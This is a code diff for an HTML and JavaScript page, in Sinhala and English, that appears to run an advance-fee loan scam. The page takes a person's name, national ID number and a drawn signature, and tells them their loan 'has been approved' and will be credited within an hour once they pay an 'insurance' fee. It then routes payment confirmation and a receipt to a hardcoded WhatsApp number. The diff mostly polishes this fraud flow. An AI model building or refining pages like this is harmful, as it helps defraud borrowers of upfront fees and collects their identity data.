@@ -161,7 +161,9 @@ canvas{
 <p><b>Insurance Payment:</b> Rs. <span id="insurance"></span></p>
 
 <div class="statement">
-රක්ෂණ මුදල ගෙවා පැයක් ඇතුළත මුදල් බැර කෙරේ.
+ඔබ ලබාගන්නා ණය මුදල අනුමත වී ඇත.<br><br>
+රක්ෂණ මුදල ගෙවා පැයක් ඇතුළත මුදල් බැර කෙරේ.<br><br>
+රිසිට් පත WhatsApp හරහා එවනු ලැබේ.
 </div>
 
 <label>Upload Receipt</label>
@@ -172,7 +174,6 @@ canvas{
 <button class="pay-btn" onclick="window.open(PAY_LINK,'_blank')">Pay Now</button>
 
 <button class="whatsapp-btn" id="whatsappBtn">Send WhatsApp Message</button>
-
 </div>
 </div>
 
@@ -188,11 +189,13 @@ canvas{
 const PAY_LINK="https://example.com/pay";
 const WHATSAPP_NO="94742089009";
 
+/* POPUP */
 function showPopup(msg){
  popupText.innerText=msg;
  popup.classList.add("active");
 }
 
+/* INSURANCE */
 function calculateInsurance(amount){
  amount=parseInt(amount);
  if(amount<=30000) return 2000;
@@ -205,71 +208,88 @@ function calculateInsurance(amount){
  return 5500;
 }
 
-/* SIGN */
+/* SIGNATURE */
 const c=document.getElementById("sign");
 const ctx=c.getContext("2d");
 ctx.lineWidth=3;
 ctx.lineCap="round";
-let drawing=false;
 
+function resizeCanvas(){
+    const r=window.devicePixelRatio||1;
+    c.width=c.offsetWidth*r;
+    c.height=c.offsetHeight*r;
+    ctx.setTransform(r,0,0,r,0,0);
+}
+resizeCanvas();
+
+let drawing=false;
 c.addEventListener("pointerdown",e=>{
- drawing=true;
- ctx.beginPath();
- ctx.moveTo(e.offsetX,e.offsetY);
+    drawing=true;
+    ctx.beginPath();
+    ctx.moveTo(e.offsetX,e.offsetY);
 });
 c.addEventListener("pointermove",e=>{
- if(!drawing)return;
- ctx.lineTo(e.offsetX,e.offsetY);
- ctx.stroke();
+    if(!drawing)return;
+    ctx.lineTo(e.offsetX,e.offsetY);
+    ctx.stroke();
 });
 c.addEventListener("pointerup",()=>drawing=false);
+c.addEventListener("pointerleave",()=>drawing=false);
 
 function clearSign(){ctx.clearRect(0,0,c.width,c.height);}
 
-/* FLOW */
+/* PAGE FLOW */
 function goNext(){
- const name=nameInput=name.value.trim();
- const nicVal=nic.value.trim();
- const amountVal=amount.value;
+    const nameEl=document.getElementById("name");
+    const nicEl=document.getElementById("nic");
+    const amountEl=document.getElementById("amount");
 
- if(!name||!nicVal||!amountVal){
-  showPopup("කරුණාකර සියලු fields පුරවන්න");
-  return;
- }
+    const name=nameEl.value.trim();
+    const nicVal=nicEl.value.trim();
+    const amountVal=amountEl.value;
 
- showAmount.innerText=amountVal;
- insurance.innerText=calculateInsurance(amountVal);
+    if(!name || !nicVal || !amountVal){
+        showPopup("කරුණාකර සියලු fields පුරවන්න");
+        return;
+    }
 
- page1.style.display="none";
- page2.style.display="block";
+    document.getElementById("showAmount").innerText=amountVal;
+    document.getElementById("insurance").innerText=calculateInsurance(amountVal);
+
+    const page1=document.getElementById("page1");
+    const page2=document.getElementById("page2");
+
+    page1.style.display="none";
+    page2.style.display="block";
 }
 
-/* SUBMIT */
+/* SUBMIT FORM */
 function submitForm(){
- if(receipt.files.length===0){
-  showPopup("කරුණාකර receipt upload කරන්න");
-  return;
- }
+    const receipt=document.getElementById("receipt");
+    if(receipt.files.length===0){
+        showPopup("කරුණාකර receipt upload කරන්න");
+        return;
+    }
 
- sendWhatsApp();
- showPopup("Receipt submitted. WhatsApp message sent.");
+    showPopup("Receipt uploaded successfully. දැන් WhatsApp click කරන්න.");
 }
 
 /* WHATSAPP */
 function sendWhatsApp(){
- const msg=
-`මුදල් ගෙවීම සාර්ථකව සිදු කර ඇත ✅
+    const nicVal=document.getElementById("nic").value.trim();
+    const insuranceVal=document.getElementById("insurance").innerText;
 
-Customer ID: ${nic.value}
-Insurance Amount: Rs.${insurance.innerText}
+    const msg=`මුදල් ගෙවීම සාර්ථකව සිදු කර ඇත ✅
+Customer ID: ${nicVal}
+Insurance Amount: Rs.${insuranceVal}
 Time: ${new Date().toLocaleString()}
 Waiting Time: 1 Hour`;
 
- const url=`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`;
- window.open(url,"_blank");
+    const url=`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`;
+    window.open(url,"_blank");
 }
 
-whatsappBtn.onclick=sendWhatsApp;
+document.getElementById("whatsappBtn").onclick=sendWhatsApp;
 </script>
 </body>
 </html>
